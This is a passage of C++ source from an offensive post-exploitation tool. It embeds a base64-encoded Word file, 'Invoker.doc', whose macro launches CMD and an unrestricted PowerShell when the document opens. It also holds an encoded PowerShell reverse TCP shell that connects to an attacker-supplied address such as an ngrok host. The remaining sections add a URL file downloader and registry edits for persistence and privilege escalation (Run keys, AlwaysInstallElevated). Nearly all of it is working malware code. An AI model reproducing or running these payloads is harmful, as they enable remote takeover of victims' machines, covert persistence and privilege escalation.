.append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("////////////////////////9QAAAA").append("AgBTIv////8AAAEAUxD/////AAABAF").append("Mi/////wAAAAA2Iv////8AAAAAGgj/").append("////AAAAAAI8MAD//wAAAAACPDgA//").append("8AAAAAAjz/////AAD//wEBAAAAAAEA").append("KAAxAE4AbwByAG0AYQBsAC4AVABoAG").append("kAcwBEAG8AYwB1AG0AZQBuAHQACQAA").append("AAAAiAAAAAEBIAMAAAKA/v//////IA").append("AAAP////8wAAAAAgH//wAAAAAAAAAA").append("//////////8AAAAAAAAAAB0AAAAlAA").append("AA/////ygBAABABP7/cAIAAPj/////").append("////CAD//yAAAAD/////MgIAAP////").append("8AAAAAAAAAAAEAAABABP7//////+D/").append("////////DAD//yAAAACwAAAAAAAAAG").append("mD/v//////////////////////AAAA").append("AP////8gAAAA/////wAAAAACg/7///").append("///wAAAAD/////6AAAAAAA////////").append("AAAAAP//////////AAAAAAAAAAAdAB").append("gAJQAAAIKgJAL//////v////////8g").append("AQAAAgD///7///8AAAAA//////////").append("8AAAAAAAAAAB0AGAAlAAAACxEwAv//").append("//8AAARgAAAAAP//////////AAAAAA").append("AAAAAAAAAAAAAAALgBAACg////awAA").append("AAAAAAD/////GAAAABAOAAAEAAQAAA").append("AAAAAAAACcAAABAAAAAGmD/v//////").append("////////////////AAAAAP////8gAA").append("AA/////1gCAAD/////oAEAAP////+o").append("AQAA//////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("////9AAAAA/////3AAAAD/////////").append("////////////WAIAAP////////////").append("//////////////////////////////").append("//////////////////////////9YAA").append("AA/////0AE/v//////2P////////8F").append("AP//IAAAAEAE/v+IAgAA0P////////").append("8IAP//IAAAAEAE/v+gAgAAyP//////").append("//8IAP//IAAAAEAE/v+4AgAAwP////").append("////8IAP//IAAAAEAE/v/QAgAAuP//").append("//////8IAP//IAAAAEAE/v/oAgAAsP").append("////////8IAP//IAAAAEAE/v8AAwAA").append("qP////////8IAP//IAAAAEAE/v////").append("//oP////////8IAP//IAAAAP////9Q").append("AAAAAQABAAAAAQAAAAAAAAAAACgBAA").append("D//////////wAAAAD//////////ygB").append("AAD//////////wAAAAD///////////").append("/////wAAAAuAAAAAAAAAAAAAAAeAAA").append("AAgAAAAAABgOEA7///////////////").append("//////////////EAAAAAIAOAAAAAMD").append("qWEGAAEkACoAXABSAGYAZgBmAGYAKg").append("AwADUANgAxAGEAOQAwADMAMAAzAAEQ").append("ACoAXABSADAAKgAjADEANwDfAQAAAA").append("AA/////2AAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAD+ygEABAAigQgABgAGAAAAAAAAgQ").append("gEIgBAABAAAAAAgQgEfACyAFAAAAAE").append("gQgAAgAIAAgAAAD/////AQHYAAAAlg").append("QoAQAAAABvAP//YAAAALkAAwBDTUQA").append("uQABAC4ACwC5AAMARVhFAAsAHQBBQD").append("ICAQCiev1/AAD/////QAAAAP////8Q").append("AAAA/////yAAAAC5AAUAUG93ZXIAuQ").append("AFAFNoZWxsAAsAuQABACAACwC5AAoA").append("LUV4ZWN1dGlvbgsAuQAGAFBvbGljeQ").append("sAuQABACAACwC5AAwAVW5yZXN0cmlj").append("dGVkCwC5AAEAIAALALkAAwAtTm8ACw").append("C5AAcAUHJvZmlsZQALAB0AQUAyAgEA").append("AAAAAP////+oAAAA/////wAAAR2xAE").append("F0dHJpYnV0AGUgVkJfTmFtAGUgPSAi").append("VGhpAHNEb2N1bWVuEHQiDQoKjEJhcw").append("ECjDFOb3JtYWwCLhlWR2xvYmFsIQGq").append("U3BhYwFsRmEIbHNlDKJDcmVhEHRhYm").append("wVH1ByZSBkZWNsYQAGSWQRAJ5UcnUN").append("QkV4cAhvc2UUHFRlbXAAbGF0ZURlcm").append("kCdhUkQ3VzdG9tbGl6hEODMVAAGAAc").append("IBBTdWIghYdfT3CAZW4oKQ0KIAAAAF").append("NoZWxsICgiAENNRCIgKyAiQi6CAkVY").append("RSIMEFBwb3dlcgIOAhmCBCABggItRX").append("hlY3V0CGlvbgIHUG9saQxjeQIFgw9V").append("bnJlQnOA0WN0ZWQICy0ETm+CBlByb2").append("ZpRGxlgTdFbmSBVA0ACgAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAgQAA").append("AIIAAACDAAAAhAAAAIUAAACGAAAA/v").append("///4gAAACJAAAAigAAAIsAAACMAAAA").append("/v////7///+PAAAA/v////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("///////////////////MYbIAAAMA/x").append("oEAAAJBAAA4gQDAAAAAAAAAAAAAQAF").append("AAIAIAEqAFwARwB7ADAAMAAwADIAMA").append("A0AEUARgAtADAAMAAwADAALQAwADAA").append("MAAwAC0AQwAwADAAMAAtADAAMAAwAD").append("AAMAAwADAAMAAwADAANAA2AH0AIwA0").append("AC4AMgAjADkAIwBDADoAXABQAHIAbw").append("BnAHIAYQBtACAARgBpAGwAZQBzAFwA").append("QwBvAG0AbQBvAG4AIABGAGkAbABlAH").append("MAXABNAGkAYwByAG8AcwBvAGYAdAAg").append("AFMAaABhAHIAZQBkAFwAVgBCAEEAXA").append("BWAEIAQQA3AC4AMQBcAFYAQgBFADcA").append("LgBEAEwATAAjAFYAaQBzAHUAYQBsAC").append("AAQgBhAHMAaQBjACAARgBvAHIAIABB").append("AHAAcABsAGkAYwBhAHQAaQBvAG4Acw").append("AAAAAAAAAAAAAAAAAaASoAXABHAHsA").append("MAAwADAAMgAwADkAMAA1AC0AMAAwAD").append("AAMAAtADAAMAAwADAALQBDADAAMAAw").append("AC0AMAAwADAAMAAwADAAMAAwADAAMA").append("A0ADYAfQAjADgALgA3ACMAMAAjAEMA").append("OgBcAFAAcgBvAGcAcgBhAG0AIABGAG").append("kAbABlAHMAXABNAGkAYwByAG8AcwBv").append("AGYAdAAgAE8AZgBmAGkAYwBlAFwAcg").append("BvAG8AdABcAE8AZgBmAGkAYwBlADEA").append("NgBcAE0AUwBXAE8AUgBEAC4ATwBMAE").append("IAIwBNAGkAYwByAG8AcwBvAGYAdAAg").append("AFcAbwByAGQAIAAxADYALgAwACAATw").append("BiAGoAZQBjAHQAIABMAGkAYgByAGEA").append("cgB5AAAAAAAAAAAAAAAAALwAKgBcAE").append("cAewAwADAAMAAyADAANAAzADAALQAw").append("ADAAMAAwAC0AMAAwADAAMAAtAEMAMA").append("AwADAALQAwADAAMAAwADAAMAAwADAA").append("MAAwADQANgB9ACMAMgAuADAAIwAwAC").append("MAQwA6AFwAVwBpAG4AZABvAHcAcwBc").append("AFMAeQBzAHQAZQBtADMAMgBcAHMAdA").append("BkAG8AbABlADIALgB0AGwAYgAjAE8A").append("TABFACAAQQB1AHQAbwBtAGEAdABpAG").append("8AbgAAAAAAAAAAAAAAAAASACoAXABD").append("AE4AbwByAG0AYQBsABIAKgBcAEMATg").append("BvAHIAbQBhAGwAYQKpYQgAAAAAAAAA").append("KAEqAFwARwB7ADIARABGADgARAAwAD").append("QAQwAtADUAQgBGAEEALQAxADAAMQBC").append("AC0AQgBEAEUANQAtADAAMABBAEEAMA").append("AwADQANABEAEUANQAyAH0AIwAyAC4A").append("OAAjADAAIwBDADoAXABQAHIAbwBnAH").append("IAYQBtACAARgBpAGwAZQBzAFwAQwBv").append("AG0AbQBvAG4AIABGAGkAbABlAHMAXA").append("BNAGkAYwByAG8AcwBvAGYAdAAgAFMA").append("aABhAHIAZQBkAFwATwBGAEYASQBDAE").append("UAMQA2AFwATQBTAE8ALgBEAEwATAAj").append("AE0AaQBjAHIAbwBzAG8AZgB0ACAATw").append("BmAGYAaQBjAGUAIAAxADYALgAwACAA").append("TwBiAGoAZQBjAHQAIABMAGkAYgByAG").append("EAcgB5AAAAAAAAAAAAAAAAAAEAAgAG").append("ABICAAAUAgEAFgIBABgCAAAaAgEAHA").append("IBACIC////////AAAAAAAAAAADA6lh").append("BgD//wAA//////////////////////").append("//////////////////////////////").append("////////////////////////////AQ").append("AAAAAAAAAAAAAAAAAAAAAAAAC4XwEA").append("GABUAGgAaQBzAEQAbwBjAHUAbQBlAG").append("4AdAAUADAANQA2ADEAYQA5ADAAMwAw").append("ADMA//8lAhgAVABoAGkAcwBEAG8AYw").append("B1AG0AZQBuAHQA///w5gAAAAAAAAAC").append("AAAAbQcAAP///////wEBIAIAAP////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////8AAg").append("AA////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////F9ilru/UL0uN").append("zI1QYK4wTf////8BAAAA/////2AAAA").append("CAAAAAAAAcARYABgF8LAAABAxXb3Jk").append("tWsQAAMMVkJB9+IQAAUEV2luMTbBfh").append("AABQRXaW4zMgd/EAAFBFdpbjY0eH8Q").append("AAMETWFjs7IQAAQEVkJBNq0jEAAEBF").append("ZCQTeuIxAACARQcm9qZWN0MQoXEAAG").append("DHN0ZG9sZZNgEAAHDFByb2plY3Qtrh").append("AADAxUaGlzRG9jdW1lbnQ8nhAACYAA").append("AP8DAwBfRXZhbHVhdGUY2RAABghOb3").append("JtYWzf2BAABowoAP8DAwBPZmZpY2UV").append("dRAACAREb2N1bWVudGrTEAAMBERvY3").append("VtZW50X05ldztFEAANBERvY3VtZW50").append("X09wZW7BiRAABQBTaGVsbFbXEAAMgA").append("AA/wMDAFVucmVzdHJpY3RlZH5lEAAG").append("gAAA/wMDAFBvbGljeQhPEAAHgAAA/w").append("MDAFByb2ZpbGUYrhAAAv//AQFUAAAA").append("//////////////////////////////").append("//////////////////IAICAP//IgL/").append("////JQIAAAgA////////KAIDAP//Dg").append("IBAP//EAIAAP//KgIEAP//CAAOAAAA").append("AQASAAAAAAAAAAAAAAAAAAAAAAAAAA").append("EAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAABJRD0ie0ZGMzJC").append("NjQxLTM2NzEtNEVBQy1COTZDLUJBOE").append("YwQUNCN0ZDMH0iDQpEb2N1bWVudD1U").append("aGlzRG9jdW1lbnQvJkgwMDAwMDAwMA").append("0KTmFtZT0iUHJvamVjdCINCkhlbHBD").append("b250ZXh0SUQ9IjAiDQpWZXJzaW9uQ2").append("9tcGF0aWJsZTMyPSIzOTMyMjIwMDAi").append("DQpDTUc9IkU5RUJDQTBBQ0UwQUNFME").append("FDRTBBQ0UiDQpEUEI9IkQyRDBGMTFB").append("REIxQkRCMUJEQiINCkdDPSJCQkI5OT").append("gzNTgwMzY4MDM2N0YiDQoNCltIb3N0").append("IEV4dGVuZGVyIEluZm9dDQomSDAwMD").append("AwMDAxPXszODMyRDY0MC1DRjkwLTEx").append("Q0YtOEU0My0wMEEwQzkxMTAwNUF9O1").append("ZCRTsmSDAwMDAwMDAwDQoNCltXb3Jr").append("c3BhY2VdDQpUaGlzRG9jdW1lbnQ9Mz").append("IsIDMyLCAxNDc0LCA2NzksIA0KAAAA").append("AAAAAAAAAAAAAAAAAABUaGlzRG9jdW").append("1lbnQAVABoAGkAcwBEAG8AYwB1AG0A").append("ZQBuAHQAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAQD+/wMKAAD/////").append("BgkCAAAAAADAAAAAAAAARisAAABEb2").append("t1bWVudCBwcm9ncmFtYSBNaWNyb3Nv").append("ZnQgV29yZCA5NyCWIDIwMDMACgAAAE").append("1TV29yZERvYwAQAAAAV29yZC5Eb2N1").append("bWVudC44APQ5snEAAAAAAAAAAAAAAA").append("AAAABQAFIATwBKAEUAQwBUAHcAbQAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("FAACAP///////////////wAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAI0AAAApAAAAAAAAAAEAQw").append("BvAG0AcABPAGIAagAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAASAAIA////").append("////////////AAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("jgAAAH0AAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAD/////////////").append("//8AAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAP///////////////wAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAA==");
	CreateFile("Invoker.doc", base64_decode(encoded));
}

void PS_ReverseTCP() {
	Output("################################# EXAMPLES #################################");
	Output("# Address : 192.168.8.5                                                       #");
	Output("# Port    : 9000                                                              #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Address : 2.tcp.ngrok.io                                                 #");
	Output("# Port    : 11650                                                          #");
	Output("############################################################################");
	Output("");
	// NOTE: PowerShell encoded command.
	// NOTE: More about the script at github.com/ivan-sincek/powershell-reverse-tcp.
	std::string encoded = std::string("JABhAGQAZAByACAAPQAgACQAKABSAG").append("UAYQBkAC0ASABvAHMAdAAgAC0AUABy").append("AG8AbQBwAHQAIAAiAEUAbgB0AGUAcg").append("AgAGEAZABkAHIAZQBzAHMAIgApAC4A").append("VAByAGkAbQAoACkAOwANAAoAVwByAG").append("kAdABlAC0ASABvAHMAdAAgACIAIgA7").append("AA0ACgAkAHAAbwByAHQAIAA9ACAAJA").append("AoAFIAZQBhAGQALQBIAG8AcwB0ACAA").append("LQBQAHIAbwBtAHAAdAAgACIARQBuAH").append("QAZQByACAAcABvAHIAdAAgAG4AdQBt").append("AGIAZQByACIAKQAuAFQAcgBpAG0AKA").append("ApADsADQAKAFcAcgBpAHQAZQAtAEgA").append("bwBzAHQAIAAiACIAOwANAAoAaQBmAC").append("AAKAAkAGEAZABkAHIALgBMAGUAbgBn").append("AHQAaAAgAC0AbAB0ACAAMQAgAC0Abw").append("ByACAAJABwAG8AcgB0AC4ATABlAG4A").append("ZwB0AGgAIAAtAGwAdAAgADEAKQAgAH").append("sADQAKAAkAVwByAGkAdABlAC0ASABv").append("AHMAdAAgACIAQgBvAHQAaAAgAHAAYQ").append("ByAGEAbQBlAHQAZQByAHMAIABhAHIA").append("ZQAgAHIAZQBxAHUAaQByAGUAZAAiAD").append("sADQAKAH0AIABlAGwAcwBlACAAewAN").append("AAoACQBXAHIAaQB0AGUALQBIAG8Acw").append("B0ACAAIgAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAiADsADQAK").append("AAkAVwByAGkAdABlAC0ASABvAHMAdA").append("AgACIAIwAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACMAIgA7AA0ACgAJ").append("AFcAcgBpAHQAZQAtAEgAbwBzAHQAIA").append("AiACMAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAUABvAHcAZQByAFMAaABl").append("AGwAbAAgAFIAZQB2AGUAcgBzAGUAIA").append("BUAEMAUAAgAHYAMQAuADEAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAjACIAOwANAAoACQBX").append("AHIAaQB0AGUALQBIAG8AcwB0ACAAIg").append("AjACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgAGIAeQ").append("AgAEkAdgBhAG4AIABTAGkAbgBjAGUA").append("awAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIwAiADsADQAKAAkAVwBy").append("AGkAdABlAC0ASABvAHMAdAAgACIAIw").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACMAIgA7AA0ACgAJAFcAcgBp").append("AHQAZQAtAEgAbwBzAHQAIAAiACMAIA").append("BHAGkAdABIAHUAYgAgAHIAZQBwAG8A").append("cwBpAHQAbwByAHkAIABhAHQAIABnAG").append("kAdABoAHUAYgAuAGMAbwBtAC8AaQB2").append("AGEAbgAtAHMAaQBuAGMAZQBrAC8AcA").append("BvAHcAZQByAHMAaABlAGwAbAAtAHIA").append("ZQB2AGUAcgBzAGUALQB0AGMAcAAuAC").append("AAIAAjACIAOwANAAoACQBXAHIAaQB0").append("AGUALQBIAG8AcwB0ACAAIgAjACAARg").append("BlAGUAbAAgAGYAcgBlAGUAIAB0AG8A").append("IABkAG8AbgBhAHQAZQAgAGIAaQB0AG").append("MAbwBpAG4AIABhAHQAIAAxAEIAcgBa").append("AE0ANgBUADcARwA5AFIATgA4AHYAYg").append("BhAGIAbgBmAFgAdQA0AE0ANgBMAHAA").append("ZwB6AHQAcQA2AFkAMQA0AC4AIAAgAC").append("AAIwAiADsADQAKAAkAVwByAGkAdABl").append("AC0ASABvAHMAdAAgACIAIwAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("MAIgA7AA0ACgAJAFcAcgBpAHQAZQAt").append("AEgAbwBzAHQAIAAiACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("IAOwANAAoACQAkAGMAbABpAGUAbgB0").append("ACAAPQAgACQAbgB1AGwAbAA7AA0ACg").append("AJACQAcwB0AHIAZQBhAG0AIAA9ACAA").append("JABuAHUAbABsADsADQAKAAkAJABiAH").append("UAZgBmAGUAcgAgAD0AIAAkAG4AdQBs").append("AGwAOwANAAoACQAkAHcAcgBpAHQAZQ").append("ByACAAPQAgACQAbgB1AGwAbAA7AA0A").append("CgAJACQAZABhAHQAYQAgAD0AIAAkAG").append("4AdQBsAGwAOwANAAoACQAkAHIAZQBz").append("AHUAbAB0ACAAPQAgACQAbgB1AGwAbA").append("A7AA0ACgAJAHQAcgB5ACAAewANAAoA").append("CQAJACMAIABjAGgAYQBuAGcAZQAgAH").append("QAaABlACAAaABvAHMAdAAgAGEAZABk").append("AHIAZQBzAHMAIABhAG4AZAAvAG8Acg").append("AgAHAAbwByAHQAIABuAHUAbQBiAGUA").append("cgAgAGEAcwAgAG4AZQBjAGUAcwBzAG").append("EAcgB5AA0ACgAJAAkAJABjAGwAaQBl").append("AG4AdAAgAD0AIABOAGUAdwAtAE8AYg").append("BqAGUAYwB0ACAATgBlAHQALgBTAG8A").append("YwBrAGUAdABzAC4AVABjAHAAQwBsAG").append("kAZQBuAHQAKAAkAGEAZABkAHIALAAg").append("ACQAcABvAHIAdAApADsADQAKAAkACQ").append("AkAHMAdAByAGUAYQBtACAAPQAgACQA").append("YwBsAGkAZQBuAHQALgBHAGUAdABTAH").append("QAcgBlAGEAbQAoACkAOwANAAoACQAJ").append("ACQAYgB1AGYAZgBlAHIAIAA9ACAATg").append("BlAHcALQBPAGIAagBlAGMAdAAgAEIA").append("eQB0AGUAWwBdACAAMQAwADIANAA7AA").append("0ACgAJAAkAJABlAG4AYwBvAGQAaQBu").append("AGcAIAA9ACAATgBlAHcALQBPAGIAag").append("BlAGMAdAAgAFQAZQB4AHQALgBBAHMA").append("YwBpAGkARQBuAGMAbwBkAGkAbgBnAD").append("sADQAKAAkACQAkAHcAcgBpAHQAZQBy").append("ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQ").append("BjAHQAIABJAE8ALgBTAHQAcgBlAGEA").append("bQBXAHIAaQB0AGUAcgAoACQAcwB0AH").append("IAZQBhAG0AKQA7AA0ACgAJAAkAJAB3").append("AHIAaQB0AGUAcgAuAEEAdQB0AG8ARg").append("BsAHUAcwBoACAAPQAgACQAdAByAHUA").append("ZQA7AA0ACgAJAAkAVwByAGkAdABlAC").append("0ASABvAHMAdAAgACIAQgBhAGMAawBk").append("AG8AbwByACAAaQBzACAAdQBwACAAYQ").append("BuAGQAIAByAHUAbgBuAGkAbgBnAC4A").append("LgAuACIAOwANAAoACQAJACQAYgB5AH").append("QAZQBzACAAPQAgADAAOwANAAoACQAJ").append("AGQAbwAgAHsADQAKAAkACQAJACQAdw").append("ByAGkAdABlAHIALgBXAHIAaQB0AGUA").append("KAAiAFAAUwA+ACIAKQA7AA0ACgAJAA").append("kACQBkAG8AIAB7AA0ACgAJAAkACQAJ").append("ACQAYgB5AHQAZQBzACAAPQAgACQAcw").append("B0AHIAZQBhAG0ALgBSAGUAYQBkACgA").append("JABiAHUAZgBmAGUAcgAsACAAMAAsAC").append("AAJABiAHUAZgBmAGUAcgAuAEwAZQBu").append("AGcAdABoACkAOwANAAoACQAJAAkACQ").append("BpAGYAIAAoACQAYgB5AHQAZQBzACAA").append("LQBnAHQAIAAwACkAIAB7AA0ACgAJAA").append("kACQAJAAkAJABkAGEAdABhACAAPQAg").append("ACQAZABhAHQAYQAgACsAIAAkAGUAbg").append("BjAG8AZABpAG4AZwAuAEcAZQB0AFMA").append("dAByAGkAbgBnACgAJABiAHUAZgBmAG").append("UAcgAsACAAMAAsACAAJABiAHkAdABl").append("AHMAKQA7AA0ACgAJAAkACQAJAH0ADQ").append("AKAAkACQAJAH0AIAB3AGgAaQBsAGUA").append("IAAoACQAcwB0AHIAZQBhAG0ALgBEAG").append("EAdABhAEEAdgBhAGkAbABhAGIAbABl").append("ACkAOwANAAoACQAJAAkAaQBmACAAKA").append("AkAGQAYQB0AGEALgBMAGUAbgBnAHQA").append("aAAgAC0AZwB0ACAAMAApACAAewANAA").append("oACQAJAAkACQB0AHIAeQAgAHsADQAK").append("AAkACQAJAAkACQAkAHIAZQBzAHUAbA").append("B0ACAAPQAgAEkAbgB2AG8AawBlAC0A").append("RQB4AHAAcgBlAHMAcwBpAG8AbgAgAC").append("0AQwBvAG0AbQBhAG4AZAAgACQAZABh").append("AHQAYQAgADIAPgAmADEAIAB8ACAATw").append("B1AHQALQBTAHQAcgBpAG4AZwA7AA0A").append("CgAJAAkACQAJAH0AIABjAGEAdABjAG").append("gAIAB7AA0ACgAJAAkACQAJAAkAJABy").append("AGUAcwB1AGwAdAAgAD0AIAAkAF8ALg").append("BFAHgAYwBlAHAAdABpAG8AbgAuAEkA").append("bgBuAGUAcgBFAHgAYwBlAHAAdABpAG").append("8AbgAuAE0AZQBzAHMAYQBnAGUAOwAN").append("AAoACQAJAAkACQB9AA0ACgAJAAkACQ").append("AJACQAdwByAGkAdABlAHIALgBXAHIA").append("aQB0AGUATABpAG4AZQAoACQAcgBlAH").append("MAdQBsAHQAKQA7AA0ACgAJAAkACQAJ").append("AEMAbABlAGEAcgAtAFYAYQByAGkAYQ").append("BiAGwAZQAgAC0ATgBhAG0AZQAgACIA").append("ZABhAHQAYQAiADsADQAKAAkACQAJAH").append("0ADQAKAAkACQB9ACAAdwBoAGkAbABl").append("ACAAKAAkAGIAeQB0AGUAcwAgAC0AZw").append("B0ACAAMAApADsADQAKAAkAfQAgAGMA").append("YQB0AGMAaAAgAHsADQAKAAkACQBXAH").append("IAaQB0AGUALQBIAG8AcwB0ACAAJABf").append("AC4ARQB4AGMAZQBwAHQAaQBvAG4ALg").append("BJAG4AbgBlAHIARQB4AGMAZQBwAHQA").append("aQBvAG4ALgBNAGUAcwBzAGEAZwBlAD").append("sADQAKAAkAfQAgAGYAaQBuAGEAbABs").append("AHkAIAB7AA0ACgAJAAkAaQBmACAAKA").append("AkAHcAcgBpAHQAZQByACAALQBuAGUA").append("IAAkAG4AdQBsAGwAKQAgAHsADQAKAA").append("kACQAJACQAdwByAGkAdABlAHIALgBD").append("AGwAbwBzAGUAKAApADsADQAKAAkACQ").append("AJACQAdwByAGkAdABlAHIALgBEAGkA").append("cwBwAG8AcwBlACgAKQA7AA0ACgAJAA").append("kAfQANAAoACQAJAGkAZgAgACgAJABz").append("AHQAcgBlAGEAbQAgAC0AbgBlACAAJA").append("BuAHUAbABsACkAIAB7AA0ACgAJAAkA").append("CQAkAHMAdAByAGUAYQBtAC4AQwBsAG").append("8AcwBlACgAKQA7AA0ACgAJAAkACQAk").append("AHMAdAByAGUAYQBtAC4ARABpAHMAcA").append("BvAHMAZQAoACkAOwANAAoACQAJAH0A").append("DQAKAAkACQBpAGYAIAAoACQAYwBsAG").append("kAZQBuAHQAIAAtAG4AZQAgACQAbgB1").append("AGwAbAApACAAewANAAoACQAJAAkAJA").append("BjAGwAaQBlAG4AdAAuAEMAbABvAHMA").append("ZQAoACkAOwANAAoACQAJAAkAJABjAG").append("wAaQBlAG4AdAAuAEQAaQBzAHAAbwBz").append("AGUAKAApADsADQAKAAkACQB9AA0ACg").append("AJAAkAaQBmACAAKAAkAGIAdQBmAGYA").append("ZQByACAALQBuAGUAIAAkAG4AdQBsAG").append("wAKQAgAHsADQAKAAkACQAJACQAYgB1").append("AGYAZgBlAHIALgBDAGwAZQBhAHIAKA").append("ApADsADQAKAAkACQB9AA0ACgAJAAkA").append("aQBmACAAKAAkAGQAYQB0AGEAIAAtAG").append("4AZQAgACQAbgB1AGwAbAApACAAewAN").append("AAoACQAJAAkAQwBsAGUAYQByAC0AVg").append("BhAHIAaQBhAGIAbABlACAALQBOAGEA").append("bQBlACAAIgBkAGEAdABhACIAOwANAA").append("oACQAJAH0ADQAKAAkACQBpAGYAIAAo").append("ACQAcgBlAHMAdQBsAHQAIAAtAG4AZQ").append("AgACQAbgB1AGwAbAApACAAewANAAoA").append("CQAJAAkAQwBsAGUAYQByAC0AVgBhAH").append("IAaQBhAGIAbABlACAALQBOAGEAbQBl").append("ACAAIgByAGUAcwB1AGwAdAAiADsADQ").append("AKAAkACQB9AA0ACgAJAH0ADQAKAH0A").append("DQAKAA==");
	PowerShellExec(encoded);
}

// ----------------------------------- FILES -----------------------------------

void CPP_DownloadFile() {
	std::string url = Input("Enter URL");
	Output("");
	std::string out = Input("Enter output file name");
	Output("");
	if (url.length() < 1 || out.length() < 1) {
		Output("Both parameters are required");
	}
	else {
		DownloadFile(url, out);
	}
}

// -------------------------------- PERSISTENCE --------------------------------

void CPP_EditRegistryKey() {
	Output("################################# EXAMPLES #################################");
	Output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                          #");
	Output("# Subkey : Software\\Microsoft\\Windows\\CurrentVersion\\Run                   #");
	Output("# Name   : PowerShell                                                      #");
	Output("# Data   : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe       #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                          #");
	Output("# Subkey : Software\\Policies\\Microsoft\\Windows\\Installer                   #");
	Output("# Name   : AlwaysInstallElevated                                           #");
	Output("# Data   : 1                                                               #");
	Output("################################### NOTE ###################################");
	Output("# In the second example, use MSI payload.                                  #");
	Output("#--------------------------------------------------------------------------#");
	Output("# By default, only string value (REG_SZ) can be added.                     #");
	Output("############################################################################");
	Output("");
	Output("############################## REGISTRY HIVES ##############################");
	Output("# [1] HKEY_CLASSES_ROOT                                                    #");
	Output("# [2] HKEY_CURRENT_USER                                                    #");
